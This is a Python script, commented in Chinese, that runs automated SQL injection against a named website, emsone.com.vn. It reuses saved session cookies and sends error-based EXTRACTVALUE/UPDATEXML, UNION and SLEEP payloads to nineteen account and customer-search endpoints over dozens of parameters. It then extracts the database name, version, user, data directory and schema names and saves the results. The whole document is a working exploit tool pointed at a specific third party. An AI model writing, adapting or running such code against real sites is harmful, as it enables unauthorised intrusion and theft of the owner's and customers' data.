#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class DeepAnalysisSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.working = []
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_with_analysis(self, endpoint, method='GET', param=None, payload=None):
        """测试并深度分析响应"""
        if method == 'GET':
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            try:
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
            except:
                return None
        elif method == 'POST':
            data = {param: payload}
            try:
                start = time.time()
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=15)
                elapsed = time.time() - start
            except:
                return None
        elif method == 'JSON':
            data = {param: payload}
            try:
                start = time.time()
                r = self.session.post(f"{self.base_url}{endpoint}", json=data, timeout=15)
                elapsed = time.time() - start
            except:
                return None
        else:
            return None
        
        # 深度分析响应
        analysis = {
            'endpoint': endpoint,
            'method': method,
            'param': param,
            'payload': payload,
            'status': r.status_code,
            'length': len(r.text),
            'elapsed': elapsed,
        }
        
        # 检查各种模式
        text_upper = r.text.upper()
        
        # 1. XPATH错误
        xpath_patterns = [
            r"XPATH syntax error: '~([^']+)~'",
            r"XPATH syntax error: '~([^~]+)~'",
            r"XPATH syntax error: '~([^']+?)'",
        ]
        for pattern in xpath_patterns:
            match = re.search(pattern, r.text, re.IGNORECASE)
            if match:
                analysis['xpath_error'] = True
                analysis['xpath_value'] = match.group(1)
                break
        
        # 2. SQL错误
        sql_error_patterns = [
            r"SQL syntax.*?MySQL",
            r"mysql.*?error",
            r"Warning.*?mysql",
            r"SQLException",
        ]
        for pattern in sql_error_patterns:
            if re.search(pattern, text_upper):
                analysis['sql_error'] = True
                break
        
        # 3. 测试字符串
        if 'TEST' in r.text:
            analysis['has_test'] = True
        
        # 4. 时间延迟
        if elapsed > 4:
            analysis['time_delay'] = True
        
        # 5. 响应差异
        # 比较正常请求和注入请求的长度
        normal_payload = "1"
        if method == 'GET':
            normal_url = f"{self.base_url}{endpoint}?{param}={normal_payload}"
            try:
                normal_r = self.session.get(normal_url, timeout=10)
                analysis['normal_length'] = len(normal_r.text)
                if abs(analysis['length'] - analysis['normal_length']) > 100:
                    analysis['length_diff'] = True
            except:
                pass
        
        # 6. 检查响应内容特征
        if 'EXTRACTVALUE' in r.text.upper() or 'UPDATEXML' in r.text.upper():
            analysis['function_reflected'] = True
        
        # 7. 检查JSON响应
        try:
            json_data = r.json()
            analysis['is_json'] = True
            # 检查JSON中是否有错误信息
            json_str = json.dumps(json_data)
            if 'error' in json_str.lower() or 'sql' in json_str.lower():
                analysis['json_error'] = True
        except:
            pass
        
        # 判断是否有效
        if any([
            analysis.get('xpath_error'),
            analysis.get('sql_error'),
            analysis.get('has_test'),
            analysis.get('time_delay'),
            analysis.get('length_diff'),
            analysis.get('function_reflected'),
        ]):
            return analysis
        
        return None
    
    def extract_database(self, endpoint, method, param):
        """提取数据库信息"""
        print(f"\n[*] 提取数据库: {endpoint} [{method}] [{param}]")
        
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
            ('SELECT @@version', 'MySQL版本'),
            ('SELECT @@datadir', '数据目录'),
            ('SELECT schema_name FROM information_schema.schemata LIMIT 0,1', '第一个数据库'),
        ]
        
        for query, label in queries:
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
            
            result = self.test_with_analysis(endpoint, method, param, payload)
            if result and result.get('xpath_value'):
                value = result['xpath_value']
                if value and len(value) > 0 and value != 'TEST':
                    print(f"    [+] {label}: {value}")
                    self.db_info[label] = value
                    return value
        
        return None
    
    def comprehensive_test_all(self):
        """全面测试所有"""
        print("[*] 全面深度测试...")
        
        endpoints = [
            '/Account/GetUserInfo',
            '/Account/JLogin',
            '/Account/Logout',
            '/Account/RegisterView',
            '/Account/Register',
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Handle/SearchListWardByDistrictID',
            '/Handle/SearchListDistrictByProvinceID',
            '/Handle/SearchListWareHouse',
            '/Handle/SearchListProductVariantByWareHouseID',
            '/Handle/SearchListFunctionalByGroupPermissionID',
            '/Handle/TransportPostageCharged',
            '/Handle/SearchPWDByVMapCode',
            '/Handle/SearchPWDByVNPMapsAutocomplete',
            '/Handle/SearchPWDByVNPMapsSearch',
            '/Handle/SearchPWDByEMSVMapsSearch',
            '/Handle/SearchPWDByEMSMapsSearch',
            '/Handle/VNPMapsAutocomplete',
        ]
        
        params = ['id', 'ID', 'Id', 'user_id', 'userID', 'userId', 'customer_id',
                  'q', 'query', 'search', 'keyword', 'name', 'email', 'mobile', 'phone',
                  'MobileNumber', 'Email', 'Password', 'Type', 'DistrictID', 'ProvinceID',
                  'WareHouseID', 'GroupPermissionID', 'VMapCode', 'VNPMapsAutocomplete',
                  'VNPMapsSearch', 'EMSVMapsSearch', 'EMSMapsSearch']
        
        payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            "1' AND updatexml(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e), 1)--",
            "1' UNION SELECT 'TEST'--",
            "1' AND SLEEP(5)--",
        ]
        
        methods = ['GET', 'POST', 'JSON']
        
        results = []
        for endpoint in endpoints:
            for param in params:
                for payload in payloads:
                    for method in methods:
                        result = self.test_with_analysis(endpoint, method, param, payload)
                        if result:
                            print(f"    [!] {endpoint} [{method}] [{param}]")
                            if result.get('xpath_value'):
                                print(f"        [+] 提取: {result['xpath_value']}")
                            results.append(result)
                            if result.get('xpath_error'):
                                # 立即尝试提取数据库
                                self.extract_database(endpoint, method, param)
        
        return results
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("深度分析SQL注入")
        print("="*60)
        
        results = self.comprehensive_test_all()
        
        # 保存结果
        with open('deep_analysis_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'results': results,
                'db_info': self.db_info
            }, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("最终结果")
        print("="*60)
        print(f"有效注入点: {len(results)}")
        print(f"数据库信息: {len(self.db_info)}")
        for k, v in self.db_info.items():
            print(f"  {k}: {v}")
        
        # 保存详细响应
        if results:
            print(f"\n[*] 保存详细响应到文件...")
            for i, result in enumerate(results[:5]):
                filename = f"sqli_response_{i}_{result['endpoint'].replace('/', '_')}.html"
                try:
                    payload = result['payload']
                    url = f"{self.base_url}{result['endpoint']}?{result['param']}={urllib.parse.quote(payload)}"
                    r = self.session.get(url, timeout=10)
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(r.text)
                    print(f"    [+] {filename}")
                except:
                    pass

if __name__ == "__main__":
    scanner = DeepAnalysisSQLi()
    scanner.run_all()